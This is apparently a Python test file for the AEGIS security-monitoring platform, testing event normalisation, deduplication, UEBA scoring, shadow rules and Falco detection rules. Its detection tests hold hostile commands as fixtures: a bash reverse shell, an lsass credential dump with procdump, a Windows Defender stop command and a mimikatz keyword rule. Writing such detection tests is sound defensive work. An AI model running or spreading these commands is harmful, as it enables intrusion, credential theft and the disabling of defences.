"""
AEGIS - End-to-End Tests for Stream Processing, UEBA, Shadow Rules, and Dedup
"""
import pytest
import asyncio
import json
import uuid
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch

from app.services.dedup_service import DedupService
from app.services.ueba_scorer import UEBAEngine, BaselineProfile
from app.services.shadow_rules import ShadowRuleEngine, ShadowRuleResult
from app.services.falco_rules import FalcoRuleEngine


# EventNormalizer without Kafka dependency (test-safe)
class TestEventNormalizer:
    """Test-safe event normalizer tests."""
    def test_normalize_process_event(self):
        from app.streaming.processor import EventNormalizer
        normalizer = EventNormalizer()
        raw = {"event_id": "evt-1", "tenant_id": "t1", "source": "sysmon",
               "source_type": "windows", "raw_data": {"EventID": "1", "process_creation": True, "CommandLine": "cmd.exe"}}
        result = normalizer.normalize(raw)
        assert result["event_type"] == "process_create"
        assert result["tenant_id"] == "t1"

    def test_normalize_powershell(self):
        from app.streaming.processor import EventNormalizer
        normalizer = EventNormalizer()
        raw = {"raw_data": {"powershell": True, "ScriptBlockText": "Invoke-Expression"}}
        result = normalizer.normalize(raw)
        assert result["event_type"] == "powershell"

    def test_normalize_authentication(self):
        from app.streaming.processor import EventNormalizer
        normalizer = EventNormalizer()
        raw = {"raw_data": {"login": True, "EventID": 4625, "TargetUserName": "admin"}}
        result = normalizer.normalize(raw)
        assert result["event_type"] == "authentication"


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Dedup Service Tests
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TestDedupService:
    def test_fingerprint_deterministic(self):
        svc = DedupService()
        event = {"source": "agent", "source_ip": "10.0.0.1", "hostname": "web-01", "event_type": "process_create"}
        fp1 = svc._compute_event_fingerprint(event)
        fp2 = svc._compute_event_fingerprint(event)
        assert fp1 == fp2
        assert len(fp1) == 64

    def test_fingerprint_variation(self):
        svc = DedupService()
        e1 = {"source": "agent", "source_ip": "10.0.0.1", "hostname": "web-01"}
        e2 = {"source": "agent", "source_ip": "10.0.0.2", "hostname": "web-01"}
        fp1 = svc._compute_event_fingerprint(e1)
        fp2 = svc._compute_event_fingerprint(e2)
        assert fp1 != fp2

    @pytest.mark.asyncio
    async def test_dedup_returns_false_for_new_event(self):
        svc = DedupService()
        svc._redis = MagicMock()
        svc._redis.execute_command = AsyncMock(return_value=0)
        svc._redis.expire = AsyncMock()

        is_dup, fp = await svc.is_event_duplicate("tenant-1", {"source": "test"})
        assert not is_dup
        assert len(fp) == 64


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# UEBA Scorer Tests
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TestUEBABaseline:
    def test_baseline_profile_update(self):
        bp = BaselineProfile("host-1", "host")
        for i in range(100):
            bp.update(float(i % 10))
        assert bp.count == 100
        assert 4.0 < bp.mean < 5.0
        assert bp.std > 0

    def test_z_score_normal(self):
        bp = BaselineProfile("host-1", "host")
        for _ in range(50):
            bp.update(10.0)
        assert abs(bp.z_score(10.0)) < 0.01

    def test_z_score_anomaly(self):
        bp = BaselineProfile("host-1", "host")
        for _ in range(50):
            bp.update(10.0)
        z = abs(bp.z_score(100.0))
        assert z > 2.0

    def test_is_anomalous(self):
        bp = BaselineProfile("host-1", "host")
        for _ in range(100):
            bp.update(50.0)
        assert bp.is_anomalous(50.0) is False
        assert bp.is_anomalous(200.0) is True


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Shadow Rules Tests
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TestShadowRules:
    def test_shadow_evaluation(self):
        engine = ShadowRuleEngine("tenant-1")
        rule = MagicMock()
        rule.id = uuid.uuid4()
        rule.name = "TestRule"
        rule.rule_content = {
            "detection": {
                "test_sel": ["mimikatz", "powershell"],
                "condition": "test_sel",
            }
        }

        events = [
            {"EventID": "1", "CommandLine": "powershell.exe -enc something"},
            {"EventID": "2", "CommandLine": "notepad.exe"},
        ]

        results = engine.evaluate(rule, events, variant="shadow")
        assert len(results) == 2
        assert results[0].matched is True
        assert results[0].rule_name == "TestRule"

    def test_shadow_stats_accumulation(self):
        engine = ShadowRuleEngine("tenant-1")
        rule = MagicMock()
        rule.id = uuid.uuid4()
        rule.name = "Test"
        rule.rule_content = {"detection": {"sel": ["test"], "condition": "sel"}}

        for _ in range(10):
            engine.evaluate(rule, [{"EventID": "1", "details": "test event"}])

        stats = engine.get_shadow_stats()
        assert len(stats) == 1
        assert stats[0]["total_evaluated"] == 10

    def test_ab_test_comparison(self):
        engine = ShadowRuleEngine("tenant-1")
        rid = str(uuid.uuid4())
        rule = MagicMock()
        rule.id = rid
        rule.name = "ABTest"

        r1 = ShadowRuleResult(rid, "ABTest", True, "process_create", "high", 5.0)
        r2 = ShadowRuleResult(rid, "ABTest", False, "process_create", "low", 2.0)
        r3 = ShadowRuleResult(rid, "ABTest", True, "process_create", "medium", 3.0)

        engine._stats[f"shadow:{rid}"] = {
            "rule_id": rid, "rule_name": "ABTest", "variant": "shadow",
            "total_evaluated": 100, "total_matched": 10,
            "total_false_positives": 2, "avg_elapsed_ms": 10,
        }
        engine._stats[f"candidate:{rid}"] = {
            "rule_id": rid, "rule_name": "ABTest", "variant": "candidate",
            "total_evaluated": 100, "total_matched": 8,
            "total_false_positives": 1, "avg_elapsed_ms": 12,
        }

        result = engine.compare_ab_test(rid)
        assert result["shadow_match_rate"] == 0.1
        assert result["candidate_match_rate"] == 0.08
        assert result["false_positive_risk"] == "low"


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Falco Rules Tests
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TestFalcoRules:
    def test_privileged_container_detection(self):
        engine = FalcoRuleEngine()
        event = {
            "syscall": "clone",
            "container": {"name": "evil", "image": "ubuntu:latest"},
            "container.privileged": True,
        }
        triggers = engine.evaluate_event(event)
        assert any(t["rule_id"] == "container_privileged_started" for t in triggers)

    def test_reverse_shell_detection(self):
        engine = FalcoRuleEngine()
        event = {
            "proc": {"name": "bash", "cmdline": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "pid": 1234},
            "fd": {"sip": "10.0.0.5", "sport": 4444},
        }
        triggers = engine.evaluate_event(event)
        assert any(t["rule_id"] == "process_reverse_shell" for t in triggers)

    def test_credential_dump_detection(self):
        engine = FalcoRuleEngine()
        event = {"proc": {"name": "procdump.exe", "cmdline": "procdump.exe -ma lsass.exe dump.dmp"}}
        triggers = engine.evaluate_event(event)
        assert any(t["rule_id"] == "credential_dump_procdump" for t in triggers)

    def test_defense_evasion_detection(self):
        engine = FalcoRuleEngine()
        event = {"proc": {"name": "cmd.exe", "cmdline": "sc stop WinDefend"}, "user": {"name": "admin"}}
        triggers = engine.evaluate_event(event)
        assert any(t["rule_id"] == "process_disable_defense" for t in triggers)

    def test_normal_event_no_match(self):
        engine = FalcoRuleEngine()
        event = {"proc": {"name": "nginx", "cmdline": "/usr/sbin/nginx -g daemon off;", "pid": 99}}
        triggers = engine.evaluate_event(event)
        assert len(triggers) == 0

    def test_get_all_rules(self):
        engine = FalcoRuleEngine()
        rules = engine.get_all_rules()
        assert len(rules) > 20
        assert all("id" in r and "name" in r and "tags" in r for r in rules)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# Window Aggregator Tests
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TestWindowAggregator:
    def test_aggregation_counts(self):
        from app.streaming.processor import WindowAggregator
        wa = WindowAggregator(300)
        now = 1000000000
        for i in range(10):
            wa.add("t1", {"event_type": "process_create", "severity": "high", "source_ip": f"10.0.0.{i}", "timestamp": now})
        agg = wa.get_aggregates("t1")
        assert agg["count"] == 10
        assert agg["unique_source_ips"] == 10

    def test_severity_distribution(self):
        from app.streaming.processor import WindowAggregator
        wa = WindowAggregator(300)
        now = 1000000000
        for sev in ["critical", "critical", "high", "medium", "low", "low", "low"]:
            wa.add("t1", {"event_type": "generic", "severity": sev, "timestamp": now})
        agg = wa.get_aggregates("t1")
        dist = agg["severity_distribution"]
        assert dist["critical"] == 2
        assert dist["medium"] == 1
        assert dist["low"] == 3
